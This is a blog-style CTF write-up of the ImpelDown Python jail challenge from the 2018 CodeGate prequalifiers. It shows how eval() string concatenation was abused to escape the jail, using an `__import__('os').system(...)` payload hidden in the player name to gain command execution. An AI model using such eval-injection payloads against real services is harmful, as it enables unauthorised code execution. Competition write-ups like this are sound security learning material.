---
layout: post
title: Writeup (CTF) - ImpelDown CodeGate PreQuals 2018 (MISC)
date: 2018-02-03 10:00:00
categories: posts
en: true
description: Solution to an easy python jail challenge
keywords: "impeldown, python, jail, sandbox, ctf, ID-10-T, ka0labs"
authors:
    - X-C3LL
---

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
This weekend was the second that we play CTFs together as [ID-10-T](https://ctftime.org/team/50611) team. We try to play two CTFs at same time (Sharif & CodeGate Prequals), but we have learned a lesson: we are not ready to play two CTFs simultaneously at this moment. We ranked as 2nd at Sharif CTF and 47th at CodeGate Prequals (not bad, but it was an overkill weekend). Lets see how we solved "ImpelDown" challenge.


## ImpelDown

Let's connect to the server:

```
$ nc ch41l3ng3s.codegate.kr 2014

                    __
          PyJail   /__\
       ____________|  |
       |_|_|_|_|_|_|  |
       |_|_|_|_|_|_|__|
      A@\|_|_|_|_|_|/@@Aa
   aaA@@@@@@@@@@@@@@@@@@@aaaA
  A@@@@@@@@@@@@@@@@@@@@@@@@@@A
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
[!] Rule
1. After 3 day, the Light will be Turned Off then you Cannot see anything.
2. Cannot Use Some Special Characters in PyJail.
3. For 10 days, You can enter 38 characters per day.

Can You Escape from Here ??

 Name : aaaaaaaaaaaa
[day-1]
################## Work List ##################
  coworker        : Find Coworker For Escape
  tool            : Find Any Tool
  dig             : Go Deep~
  bomb            : make boooooooomb!!!
###############################################
tool(),
 aaaaaaaaaaaa : [Tool] Find : Knife !
Traceback (most recent call last):
  File "/home/impel_down/Impel_Down.py", line 141, in <module>
    watcher.Behavior_analysis(result)
  File "/home/impel_down/Impel_Down.py", line 67, in Behavior_analysis
    player_info = pickle.loads(Player)
  File "/usr/lib/python2.7/pickle.py", line 1387, in loads
    file = StringIO(str)
TypeError: StringIO() argument 1 must be string or buffer, not tuple

```

Ooops. That was an easy bug to trigger. Looks like some type of python jail, where we can set an username and then start sending pre-built actions (tool, dig, bomb...) like in a game. But the interesing thing here is that "pickle" error. We can keep poking around a bit more:

```
tool(),cmd
" : [Tool] Find : gun !
Traceback (most recent call last):
 File "/home/impel_down/Impel_Down.py", line 140, in <module>
   result = eval("your."+work+"()")
 File "<string>", line 1, in <module>
TypeError: 'str' object is not callable
```

Oh, nice. They are doing a concatenation of "your." + what we write as "action" + "()", so the point here is to see what we can do with that "your". Maybe we can exfiltrate more information calling the built-in help() ? (Spoiler: it worked):

```
tool(),help(your),

 " : [Tool] Find : book !

Help on instance of Esacpe_Player in module __main__:

class Esacpe_Player

 |  Methods defined here:

 |  

 |  __init__(self, name, day)

 |  

 |  bomb(self)

 |  

 |  coworker(self)

 |  

 |  dig(self)

 |  

 |  tool(self)

```

Did you see that "name"?. At this point is pretty clear what we have to do to solve this challenge and escape from the jail: insert a payload to our name and then reference it inside the eval(). We choose `__import__('os').system('ls')` as our name and `tool(),eval(your.name),` as action:

```
tool(),eval(your.name),
__import__('os').system('ls') : [Tool] Find : Knife !                                    │
Impel_Down.py                                                                             │
run.sh
```

Din, din, din! We have a cool RCE on this challenge. Just search in the filesystem for the flag and win your points :)

```
FLAG{Pyth0n J@il escape 1s always fun @nd exc1ting ! :)}
```

## Final words

This was a really easy (and funny) challenge. It worked as a break to my mind in this killer weekend.
